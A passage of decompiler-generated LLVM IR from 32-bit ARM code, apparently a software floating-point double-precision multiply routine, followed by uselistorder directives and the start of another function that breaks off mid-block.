  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1c884 = load i32, i32* @r4, align 4
  store i32 %v3_1c884, i32* %stack_var_-16, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1c890 = udiv i32 %arg1, 1048576
  %v5_1c890 = urem i32 %v4_1c890, 2048
  store i32 %v5_1c890, i32* %r4.global-to-local, align 4
  %v6_1c890 = icmp eq i32 %v5_1c890, 0
  br i1 %v6_1c890, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v5_1c894 = udiv i32 %arg3, 1048576
  %v6_1c894 = urem i32 %v5_1c894, 2048
  store i32 %v6_1c894, i32* @r5, align 4
  %v7_1c894 = icmp eq i32 %v6_1c894, 0
  br i1 %v7_1c894, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_1c898 = icmp eq i32 %v5_1c890, 2047
  br i1 %v5_1c898, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_1c89c = icmp eq i32 %v6_1c894, 2047
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb41, %bb42
  %v0_1c8a0 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_1c89c, %bb42 ], [ true, %entry ]
  store i32 116900, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1c8a0, i32 ptrtoint (i32* @global_var_1cb20.1098 to i32))
  %v0_1c8a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c8a4 = load i32, i32* @r5, align 4
  %v2_1c8a4 = add i32 %v1_1c8a4, %v0_1c8a4
  store i32 %v2_1c8a4, i32* %r4.global-to-local, align 4
  %v2_1c8a8 = xor i32 %arg3, %arg1
  %v1_1c8ac = load i32, i32* %ip.global-to-local, align 4
  %tmp = mul i32 %v1_1c8ac, -2097152
  %v5_1c8ac = add i32 %tmp, -1
  %v6_1c8ac = and i32 %v5_1c8ac, %arg1
  store i32 %v6_1c8ac, i32* %r0.global-to-local, align 4
  %v6_1c8b0 = and i32 %v5_1c8ac, %arg3
  store i32 %v6_1c8b0, i32* %r2.global-to-local, align 4
  %v4_1c8b4 = mul i32 %arg1, 4096
  %v5_1c8b4 = or i32 %v4_1c8b4, %arg2
  %v7_1c8b4 = icmp eq i32 %v5_1c8b4, 0
  br i1 %v7_1c8b4, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_1c8bc17 = or i32 %v6_1c8ac, 1048576
  store i32 %v1_1c8bc17, i32* %r0.global-to-local, align 4
  %v1_1c8c018 = or i32 %v6_1c8b0, 1048576
  store i32 %v1_1c8c018, i32* %r2.global-to-local, align 4
  %v1_1c9f819 = and i32 %v2_1c8a8, -2147483648
  br label %dec_label_pc_1c9f8

bb43:                                             ; preds = %.thread1
  %v5_1c8b8 = mul i32 %arg3, 4096
  %v6_1c8b8 = or i32 %v5_1c8b8, %arg4
  %v8_1c8b8 = icmp eq i32 %v6_1c8b8, 0
  %v1_1c8bc = or i32 %v6_1c8ac, 1048576
  store i32 %v1_1c8bc, i32* %r0.global-to-local, align 4
  %v1_1c8c0 = or i32 %v6_1c8b0, 1048576
  store i32 %v1_1c8c0, i32* %r2.global-to-local, align 4
  %v1_1c9f8 = and i32 %v2_1c8a8, -2147483648
  br i1 %v8_1c8b8, label %dec_label_pc_1c9f8, label %dec_label_pc_1c8c8

dec_label_pc_1c8c8:                               ; preds = %bb43
  store i32 %v1_1c9f8, i32* %stack_var_-40, align 4
  %v9_1c8cc = load i32, i32* @r8, align 4
  %v12_1c8cc = load i32, i32* @sb, align 4
  %v3_1c8d0 = udiv i32 %arg2, 65536
  %v3_1c8d4 = udiv i32 %arg4, 65536
  store i32 %v3_1c8d4, i32* %r8.global-to-local, align 4
  %v3_1c8d8 = udiv i32 %v1_1c8bc, 65536
  store i32 %v3_1c8d8, i32* %sb.global-to-local, align 4
  %v3_1c8dc = udiv i32 %v1_1c8c0, 65536
  %tmp59 = mul i32 %v3_1c8d0, -65536
  %v5_1c8e0 = add i32 %tmp59, -1
  %v6_1c8e0 = and i32 %v5_1c8e0, %arg2
  store i32 %v6_1c8e0, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_1c8d4, -65536
  %v5_1c8e4 = add i32 %tmp60, -1
  %v6_1c8e4 = and i32 %v5_1c8e4, %arg4
  %tmp61 = mul i32 %v3_1c8d8, -65536
  %v5_1c8e8 = add i32 %tmp61, -1
  %v6_1c8e8 = and i32 %v6_1c8ac, %v5_1c8e8
  store i32 %v6_1c8e8, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_1c8dc, -65536
  %v5_1c8ec = add i32 %tmp62, -1
  %v6_1c8ec = and i32 %v6_1c8b0, %v5_1c8ec
  store i32 %v6_1c8ec, i32* %r2.global-to-local, align 4
  %v2_1c8f0 = mul i32 %v6_1c8e4, %v6_1c8e0
  %v2_1c8f4 = mul i32 %v3_1c8d4, %v6_1c8e0
  %v2_1c900 = and i32 %v2_1c8f4, 32768
  %v3_1c900 = icmp ne i32 %v2_1c900, 0
  %v4_1c900 = udiv i32 %v2_1c8f4, 65536
  %v7_1c900 = zext i1 %v3_1c900 to i32
  %v2_1c904 = mul i32 %v6_1c8e4, %v3_1c8d0
  %tmp53 = add i32 %v2_1c904, %v2_1c8f4
  %tmp54 = mul i32 %tmp53, 65536
  %v5_1c908 = add i32 %tmp54, %v2_1c8f0
  store i32 %v5_1c908, i32* %ip.global-to-local, align 4
  %v2_1c90c = and i32 %v2_1c904, 32768
  %v3_1c90c = icmp ne i32 %v2_1c90c, 0
  %v4_1c90c = udiv i32 %v2_1c904, 65536
  %v7_1c90c = zext i1 %v3_1c90c to i32
  %v2_1c910 = mul i32 %v3_1c8dc, %v6_1c8e0
  %v2_1c91c = and i32 %v2_1c910, 32768
  %v3_1c91c = icmp ne i32 %v2_1c91c, 0
  %v4_1c91c = udiv i32 %v2_1c910, 65536
  %v7_1c91c = zext i1 %v3_1c91c to i32
  %v8_1c91c = add nuw nsw i32 %v7_1c91c, %v4_1c91c
  %v2_1c920 = mul i32 %v6_1c8ec, %v3_1c8d0
  %v2_1c928 = and i32 %v2_1c920, 32768
  %v3_1c928 = icmp ne i32 %v2_1c928, 0
  %v4_1c928 = udiv i32 %v2_1c920, 65536
  %v6_1c928 = add nuw nsw i32 %v8_1c91c, %v4_1c928
  %v7_1c928 = zext i1 %v3_1c928 to i32
  %v8_1c928 = add nuw nsw i32 %v6_1c928, %v7_1c928
  %v2_1c92c = mul i32 %v3_1c8d4, %v6_1c8e8
  %v2_1c934 = and i32 %v2_1c92c, 32768
  %v3_1c934 = icmp ne i32 %v2_1c934, 0
  %v4_1c934 = udiv i32 %v2_1c92c, 65536
  %v6_1c934 = add nuw nsw i32 %v8_1c928, %v4_1c934
  %v7_1c934 = zext i1 %v3_1c934 to i32
  %v8_1c934 = add nuw nsw i32 %v6_1c934, %v7_1c934
  %v2_1c938 = mul i32 %v6_1c8e4, %v3_1c8d8
  %v4_1c93c = mul i32 %v2_1c938, 65536
  %tmp55 = add i32 %v2_1c920, %v2_1c910
  %tmp56 = add i32 %tmp55, %v2_1c92c
  %tmp57 = mul i32 %tmp56, 65536
  %v8_1c90c = add nuw nsw i32 %v7_1c900, %v4_1c900
  %v5_1c918 = add nuw nsw i32 %v8_1c90c, %v4_1c90c
  %v5_1c924 = add nuw nsw i32 %v5_1c918, %v7_1c90c
  %v5_1c930 = add i32 %v5_1c924, %v4_1c93c
  %v5_1c93c = add i32 %v5_1c930, %tmp57
  %v2_1c940 = and i32 %v2_1c938, 32768
  %v3_1c940 = icmp ne i32 %v2_1c940, 0
  %v4_1c940 = udiv i32 %v2_1c938, 65536
  %v6_1c940 = add nuw nsw i32 %v8_1c934, %v4_1c940
  %v7_1c940 = zext i1 %v3_1c940 to i32
  %v8_1c940 = add i32 %v6_1c940, %v7_1c940
  %v2_1c944 = mul i32 %v3_1c8dc, %v6_1c8e8
  %v2_1c948 = mul nuw i32 %v3_1c8dc, %v3_1c8d8
  %v4_1c94c = mul i32 %v2_1c944, 65536
  %v5_1c94c = add i32 %v8_1c940, %v4_1c94c
  %v2_1c950 = and i32 %v2_1c944, 32768
  %v3_1c950 = icmp ne i32 %v2_1c950, 0
  %v4_1c950 = udiv i32 %v2_1c944, 65536
  %v6_1c950 = add i32 %v4_1c950, %v2_1c948
  %v7_1c950 = zext i1 %v3_1c950 to i32
  %v2_1c954 = mul i32 %v6_1c8ec, %v3_1c8d8
  %v4_1c958 = mul i32 %v2_1c954, 65536
  %v5_1c958 = add i32 %v5_1c94c, %v4_1c958
  %v2_1c95c = and i32 %v2_1c954, 32768
  %v3_1c95c = icmp ne i32 %v2_1c95c, 0
  %v4_1c95c = udiv i32 %v2_1c954, 65536
  %v7_1c95c = zext i1 %v3_1c95c to i32
  %v2_1c960 = mul i32 %v6_1c8e0, %v6_1c8ec
  %v2_1c964 = add i32 %v2_1c960, %v5_1c93c
  %v3_1c964 = icmp ult i32 %v2_1c964, %v5_1c93c
  %v2_1c968 = mul nuw i32 %v3_1c8d0, %v3_1c8dc
  %v3_1c96c = add i32 %v5_1c958, %v2_1c968
  %v4_1c96c = zext i1 %v3_1c964 to i32
  %v5_1c96c = add i32 %v4_1c96c, %v3_1c96c
  %v9_1c96c = icmp ule i32 %v5_1c96c, %v5_1c958
  %v10_1c96c = icmp ult i32 %v3_1c96c, %v5_1c958
  %v11_1c96c = select i1 %v3_1c964, i1 %v9_1c96c, i1 %v10_1c96c
  %v2_1c970 = mul i32 %v6_1c8e4, %v6_1c8e8
  %v2_1c974 = zext i1 %v11_1c96c to i32
  %v2_1c978 = add i32 %v2_1c970, %v2_1c964
  %v3_1c978 = icmp ult i32 %v2_1c978, %v2_1c964
  %v0_1c97c = load i32, i32* %sb.global-to-local, align 4
  %v1_1c97c = load i32, i32* %r8.global-to-local, align 4
  %v2_1c97c = mul i32 %v1_1c97c, %v0_1c97c
  %v3_1c980 = add i32 %v2_1c97c, %v5_1c96c
  %v4_1c980 = zext i1 %v3_1c978 to i32
  %v5_1c980 = add i32 %v4_1c980, %v3_1c980
  %v9_1c980 = icmp ule i32 %v5_1c980, %v5_1c96c
  %v10_1c980 = icmp ult i32 %v3_1c980, %v5_1c96c
  %v11_1c980 = select i1 %v3_1c978, i1 %v9_1c980, i1 %v10_1c980
  %v2_1c984 = mul i32 %v1_1c97c, %v3_1c8d0
  %v2_1c988 = zext i1 %v11_1c980 to i32
  %v8_1c950 = add i32 %v6_1c950, %v4_1c95c
  %v6_1c95c = add i32 %v8_1c950, %v7_1c950
  %v8_1c95c = add i32 %v6_1c95c, %v7_1c95c
  %v3_1c974 = add i32 %v8_1c95c, %v2_1c974
  %v3_1c988 = add i32 %v3_1c974, %v2_1c988
  %v2_1c98c = add i32 %v2_1c984, %v2_1c978
  store i32 %v2_1c98c, i32* %lr.global-to-local, align 4
  %v3_1c98c = icmp ult i32 %v2_1c98c, %v2_1c978
  %v1_1c990 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c990 = mul i32 %v1_1c990, %v6_1c8e8
  %v3_1c994 = add i32 %v5_1c980, %v2_1c990
  %v4_1c994 = zext i1 %v3_1c98c to i32
  %v5_1c994 = add i32 %v4_1c994, %v3_1c994
  %v9_1c994 = icmp ule i32 %v5_1c994, %v5_1c980
  %v10_1c994 = icmp ult i32 %v3_1c994, %v5_1c980
  %v11_1c994 = select i1 %v3_1c98c, i1 %v9_1c994, i1 %v10_1c994
  %v2_1c998 = zext i1 %v11_1c994 to i32
  %v3_1c998 = add i32 %v2_1c998, %v3_1c988
  %v2_1c99c = load i32, i32* %stack_var_-40, align 4
  store i32 %v9_1c8cc, i32* %r8.global-to-local, align 4
  store i32 %v12_1c8cc, i32* %sb.global-to-local, align 4
  %v0_1c9a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_1c9a0 = icmp eq i32 %v0_1c9a0, 0
  br i1 %v2_1c9a0, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_1c8c8
  %v2_1c9a4 = or i32 %v2_1c98c, 1
  store i32 %v2_1c9a4, i32* %lr.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1c8c8, %bb44
  %v0_1c9b8 = phi i32 [ %v2_1c98c, %dec_label_pc_1c8c8 ], [ %v2_1c9a4, %bb44 ]
  %v0_1c9a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c9a8 = add i32 %v0_1c9a8, -255
  %v2_1c9ac = icmp ugt i32 %v3_1c998, 511
  %v2_1c9b0 = icmp eq i1 %v2_1c9ac, false
  %v5_1c9b0 = sext i1 %v2_1c9b0 to i32
  %v3_1c9b0 = add nsw i32 %v5_1c9b0, -1023
  %v6_1c9b0 = add i32 %v3_1c9b0, %v0_1c9a8
  store i32 %v6_1c9b0, i32* %r4.global-to-local, align 4
  %v3_1c9b4 = icmp ugt i32 %v1_1c9a8, 768
  br i1 %v3_1c9b4, label %dec_label_pc_1c9c4, label %dec_label_pc_1c9b8

dec_label_pc_1c9b8:                               ; preds = %bb45
  %v1_1c9b8 = icmp slt i32 %v0_1c9b8, 0
  %v2_1c9b8 = mul i32 %v0_1c9b8, 2
  store i32 %v2_1c9b8, i32* %lr.global-to-local, align 4
  %v3_1c9bc = mul i32 %v5_1c994, 2
  %v4_1c9bc = zext i1 %v1_1c9b8 to i32
  %v5_1c9bc = or i32 %v4_1c9bc, %v3_1c9bc
  %v9_1c9bc = icmp ule i32 %v5_1c9bc, %v5_1c994
  %v10_1c9bc = icmp ult i32 %v3_1c9bc, %v5_1c994
  %v11_1c9bc = select i1 %v1_1c9b8, i1 %v9_1c9bc, i1 %v10_1c9bc
  %v3_1c9c0 = mul i32 %v3_1c998, 2
  %v4_1c9c0 = zext i1 %v11_1c9bc to i32
  %v5_1c9c0 = or i32 %v4_1c9c0, %v3_1c9c0
  br label %dec_label_pc_1c9c4

dec_label_pc_1c9c4:                               ; preds = %bb45, %dec_label_pc_1c9b8
  %v0_1c9d4 = phi i32 [ %v0_1c9b8, %bb45 ], [ %v2_1c9b8, %dec_label_pc_1c9b8 ]
  %v0_1c9cc = phi i32 [ %v5_1c994, %bb45 ], [ %v5_1c9bc, %dec_label_pc_1c9b8 ]
  %v1_1c9c4 = phi i32 [ %v3_1c998, %bb45 ], [ %v5_1c9c0, %dec_label_pc_1c9b8 ]
  %v4_1c9c4 = mul i32 %v1_1c9c4, 2048
  %v4_1c9c8 = udiv i32 %v0_1c9cc, 2097152
  %v5_1c9c4 = or i32 %v4_1c9c8, %v2_1c99c
  %v5_1c9c8 = or i32 %v5_1c9c4, %v4_1c9c4
  store i32 %v5_1c9c8, i32* %r0.global-to-local, align 4
  %v3_1c9cc = mul i32 %v0_1c9cc, 2048
  %v4_1c9d0 = udiv i32 %v0_1c9d4, 2097152
  %v5_1c9d0 = or i32 %v3_1c9cc, %v4_1c9d0
  store i32 %v5_1c9d0, i32* %r1.global-to-local, align 4
  %v3_1c9d4 = mul i32 %v0_1c9d4, 2048
  store i32 %v3_1c9d4, i32* %lr.global-to-local, align 4
  %v1_1c9d8 = add i32 %v6_1c9b0, -253
  store i32 %v1_1c9d8, i32* %ip.global-to-local, align 4
  %v2_1c9d8 = icmp ugt i32 %v6_1c9b0, 252
  %v7_1c9d8 = icmp eq i32 %v6_1c9b0, 253
  %v2_1c9dc = xor i1 %v7_1c9d8, true
  %v3_1c9dc = and i1 %v2_1c9d8, %v2_1c9dc
  br i1 %v3_1c9dc, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1c9c4
  %v6_1c9dc = icmp ugt i32 %v1_1c9d8, 1791
  %v11_1c9dc = icmp eq i32 %v1_1c9d8, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1c9c4, %bb46
  %v1_1c9e0 = phi i1 [ %v7_1c9d8, %dec_label_pc_1c9c4 ], [ %v11_1c9dc, %bb46 ]
  %v0_1c9e0 = phi i1 [ %v2_1c9d8, %dec_label_pc_1c9c4 ], [ %v6_1c9dc, %bb46 ]
  %v2_1c9e0 = xor i1 %v1_1c9e0, true
  %v3_1c9e0 = and i1 %v0_1c9e0, %v2_1c9e0
  call void @__pseudo_cond_branch(i1 %v3_1c9e0, i32 ptrtoint (i32* @global_var_1ca24.1099 to i32))
  %v0_1c9e4 = load i32, i32* %lr.global-to-local, align 4
  %v2_1c9e4 = icmp slt i32 %v0_1c9e4, 0
  %v6_1c9e4 = icmp eq i32 %v0_1c9e4, -2147483648
  %v1_1c9e8 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1c9e4, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_1c9e8 = urem i32 %v1_1c9e8, 2
  %v3_1c9e8 = icmp ne i32 %v2_1c9e8, 0
  %v4_1c9e8 = udiv i32 %v1_1c9e8, 2
  store i32 %v4_1c9e8, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_1c9ec = phi i1 [ %v3_1c9e8, %bb48 ], [ %v2_1c9e4, %bb47 ]
  %v2_1c9ec = zext i1 %v1_1c9ec to i32
  %v3_1c9ec = add i32 %v2_1c9ec, %v1_1c9e8
  store i32 %v3_1c9ec, i32* %r1.global-to-local, align 4
  %v0_1c9f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c9f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1c9f0 = and i32 %v1_1c9f0, 4096
  %v3_1c9f0 = icmp ne i32 %v2_1c9f0, 0
  %v4_1c9f0 = mul i32 %v1_1c9f0, 1048576
  %v6_1c9f0 = add i32 %v4_1c9f0, %v0_1c9f0
  %v7_1c9f0 = zext i1 %v3_1c9f0 to i32
  %v8_1c9f0 = add i32 %v7_1c9f0, %v6_1c9f0
  store i32 %v8_1c9f0, i32* %r0.global-to-local, align 4
  %v2_1c9f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c9f4, i32* %r4.global-to-local, align 4
  ret i32 %v8_1c9f0

dec_label_pc_1c9f8:                               ; preds = %.thread, %bb43
  %v1_1c9f822 = phi i32 [ %v1_1c9f819, %.thread ], [ %v1_1c9f8, %bb43 ]
  %v1_1c8c021 = phi i32 [ %v1_1c8c018, %.thread ], [ %v1_1c8c0, %bb43 ]
  %v1_1c8bc20 = phi i32 [ %v1_1c8bc17, %.thread ], [ %v1_1c8bc, %bb43 ]
  %v2_1c9fc = or i32 %v1_1c8bc20, %v1_1c9f822
  %v2_1ca00 = or i32 %arg4, %arg2
  store i32 %v2_1ca00, i32* %r1.global-to-local, align 4
  %v2_1ca04 = xor i32 %v2_1c9fc, %v1_1c8c021
  store i32 %v2_1ca04, i32* %r0.global-to-local, align 4
  %v4_1ca08 = udiv i32 %v1_1c8ac, 2
  %v5_1ca08 = sub i32 %v2_1c8a4, %v4_1ca08
  store i32 %v5_1ca08, i32* %r4.global-to-local, align 4
  %v7_1ca08 = sub i32 0, %v5_1ca08
  %v8_1ca08 = and i32 %v2_1c8a4, %v7_1ca08
  %v11_1ca08 = icmp eq i32 %v2_1c8a4, %v4_1ca08
  %v7_1ca0c = icmp sgt i32 %v2_1c8a4, %v4_1ca08
  br i1 %v7_1ca0c, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_1c9f8
  %v10_1ca0c = sub i32 %v1_1c8ac, %v5_1ca08
  %v12_1ca0c = xor i32 %v5_1ca08, %v1_1c8ac
  %v13_1ca0c = xor i32 %v10_1ca0c, %v1_1c8ac
  %v14_1ca0c = and i32 %v13_1ca0c, %v12_1ca0c
  %v17_1ca0c = icmp eq i32 %v1_1c8ac, %v5_1ca08
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_1c9f8, %bb49
  %v2_1ca14.in = phi i32 [ %v8_1ca08, %dec_label_pc_1c9f8 ], [ %v14_1ca0c, %bb49 ]
  %v1_1ca14.in = phi i32 [ %v5_1ca08, %dec_label_pc_1c9f8 ], [ %v10_1ca0c, %bb49 ]
  %v0_1ca14 = phi i1 [ %v11_1ca08, %dec_label_pc_1c9f8 ], [ %v17_1ca0c, %bb49 ]
  %v1_1ca14 = icmp slt i32 %v1_1ca14.in, 0
  %v2_1ca14 = icmp slt i32 %v2_1ca14.in, 0
  %v3_1ca10 = xor i1 %v2_1ca14, %v1_1ca14
  %v4_1ca10 = or i1 %v0_1ca14, %v3_1ca10
  br i1 %v4_1ca10, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_1ca1028 = mul i32 %v5_1ca08, 1048576
  %v10_1ca1029 = or i32 %v2_1ca04, %v9_1ca1028
  store i32 %v10_1ca1029, i32* %r0.global-to-local, align 4
  %v7_1ca14 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1ca14, i32* %r4.global-to-local, align 4
  ret i32 %v10_1ca1029

bb52:                                             ; preds = %bb50
  %v1_1ca18 = or i32 %v2_1ca04, 1048576
  store i32 %v1_1ca18, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_1ca20 = add i32 %v5_1ca08, -1
  store i32 %v1_1ca20, i32* %r4.global-to-local, align 4
  ret i32 %v1_1ca18

; uselistorder directives
  uselistorder i32 %v5_1ca08, { 4, 1, 0, 6, 3, 5, 2, 7 }
  uselistorder i32 %v4_1ca08, { 2, 1, 0 }
  uselistorder i32 %v2_1ca04, { 1, 0, 2 }
  uselistorder i32 %v1_1c9e8, { 2, 0, 1 }
  uselistorder i32 %v0_1c9e4, { 1, 0 }
  uselistorder i1 %v7_1c9d8, { 1, 0 }
  uselistorder i32 %v2_1c9b8, { 1, 0 }
  uselistorder i1 %v1_1c9b8, { 1, 0 }
  uselistorder i32 %v6_1c9b0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1c9b8, { 1, 0, 2 }
  uselistorder i32 %v3_1c998, { 1, 0, 2 }
  uselistorder i32 %v5_1c994, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v3_1c994, { 1, 0 }
  uselistorder i1 %v3_1c98c, { 1, 0 }
  uselistorder i32 %v5_1c980, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1c980, { 1, 0 }
  uselistorder i1 %v3_1c978, { 1, 0 }
  uselistorder i32 %v2_1c978, { 1, 0, 2 }
  uselistorder i32 %v5_1c96c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1c96c, { 1, 0 }
  uselistorder i1 %v3_1c964, { 1, 0 }
  uselistorder i32 %v2_1c964, { 1, 0, 2 }
  uselistorder i32 %v5_1c958, { 2, 1, 0 }
  uselistorder i32 %v2_1c954, { 1, 2, 0 }
  uselistorder i32 %v2_1c944, { 0, 2, 1 }
  uselistorder i32 %v5_1c93c, { 1, 0 }
  uselistorder i32 %v2_1c938, { 1, 2, 0 }
  uselistorder i32 %v2_1c92c, { 1, 0, 2 }
  uselistorder i32 %v2_1c920, { 1, 0, 2 }
  uselistorder i32 %v2_1c910, { 1, 0, 2 }
  uselistorder i32 %v2_1c904, { 0, 2, 1 }
  uselistorder i32 %v2_1c8f4, { 1, 0, 2 }
  uselistorder i32 %v6_1c8ec, { 1, 0, 2, 3 }
  uselistorder i32 %v6_1c8e8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v6_1c8e0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1c8dc, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v3_1c8d8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v3_1c8d4, { 3, 2, 0, 1 }
  uselistorder i32 %v3_1c8d0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_1c8c0, { 1, 0, 2 }
  uselistorder i32 %v1_1c8bc, { 1, 0, 2 }
  uselistorder i32 %v6_1c8b0, { 0, 2, 1, 3 }
  uselistorder i32 %v6_1c8ac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1c8ac, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1c8a8, { 1, 0 }
  uselistorder i32 %v2_1c8a4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v6_1c894, { 2, 1, 0 }
  uselistorder i32 %v5_1c890, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32 32768, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 2, 1, 14 }
  uselistorder i32* @sb, { 35, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 20, 21, 22, 23, 24, 25, 26, 27, 28, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 3, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 41, 0, 42, 17, 18, 19, 4 }
  uselistorder i32* @r8, { 186, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 62, 63, 64, 65, 66, 67, 68, 74, 218, 219, 220, 221, 222, 223, 187, 188, 198, 199, 10, 120, 125, 126, 0, 127, 168, 169, 170, 171, 1, 172, 173, 174, 175, 200, 201, 202, 203, 204, 205, 206, 207, 208, 69, 70, 71, 72, 73, 75, 76, 77, 78, 209, 210, 211, 212, 51, 52, 53, 54, 55, 56, 57, 213, 214, 215, 216, 217, 79, 224, 230, 80, 81, 100, 101, 102, 103, 104, 225, 226, 227, 228, 229, 176, 177, 178, 179, 180, 181, 189, 190, 191, 192, 193, 128, 129, 130, 131, 132, 7, 133, 194, 195, 196, 197, 58, 59, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 2, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 182, 183, 184, 185, 121, 122, 123, 124, 97, 82, 83, 11, 84, 85, 86, 5, 6, 87, 8, 88, 89, 96, 12, 60, 61, 3, 90, 91, 92, 93, 94, 95, 98, 99, 105, 9, 106, 107, 13, 14, 15, 16, 17, 4, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -2097152, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 22, 23 }
  uselistorder i32 %arg4, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 4 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_1c9f8, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1c9c4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @function_1ca24(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ca24:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_1ca24 = load i1, i1* @cpsr_z, align 1
  %v1_1ca24 = load i1, i1* @cpsr_n, align 1
  %v2_1ca24 = load i1, i1* @cpsr_v, align 1
  %v3_1ca24 = xor i1 %v1_1ca24, %v2_1ca24
  %v4_1ca24 = or i1 %v0_1ca24, %v3_1ca24
  br i1 %v4_1ca24, label %dec_label_pc_1ca28, label %dec_label_pc_1cb8c

dec_label_pc_1ca28:                               ; preds = %dec_label_pc_1ca24
  %v0_1ca28 = load i32, i32* @r4, align 4
  %v4_1ca28 = add i32 %v0_1ca28, 54
  %v6_1ca28 = sub i32 0, %v0_1ca28
  %v7_1ca28 = and i32 %v4_1ca28, %v6_1ca28
  %v8_1ca28 = icmp slt i32 %v7_1ca28, 0
  store i1 %v8_1ca28, i1* @cpsr_v, align 1
  %v9_1ca28 = icmp slt i32 %v4_1ca28, 0
  store i1 %v9_1ca28, i1* @cpsr_n, align 1
  %v10_1ca28 = icmp eq i32 %v4_1ca28, 0
  store i1 %v10_1ca28, i1* @cpsr_z, align 1
  %v7_1ca2c = icmp sgt i32 %v0_1ca28, -54
  br i1 %v7_1ca2c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1ca28
  store i32 0, i32* @r1, align 4
  %v8_1ca30 = load i32, i32* %r0.global-to-local, align 4
  %v9_1ca30 = and i32 %v8_1ca30, -2147483648
  store i32 %v9_1ca30, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_1ca30

bb6:                                              ; preds = %dec_label_pc_1ca28
  %v1_1ca38 = sub i32 0, %v0_1ca28
  %v2_1ca3c = sub i32 -32, %v0_1ca28
  %v4_1ca3c = add i32 %v0_1ca28, 31
  %v5_1ca3c = and i32 %v4_1ca3c, %v1_1ca38
  %v6_1ca3c = icmp slt i32 %v5_1ca3c, 0
  store i1 %v6_1ca3c, i1* @cpsr_v, align 1
  %v6_1ca40 = icmp slt i32 %v1_1ca38, 32
  br i1 %v6_1ca40, label %dec_label_pc_1ca44, label %dec_label_pc_1caa8

dec_label_pc_1ca44:                               ; preds = %bb6
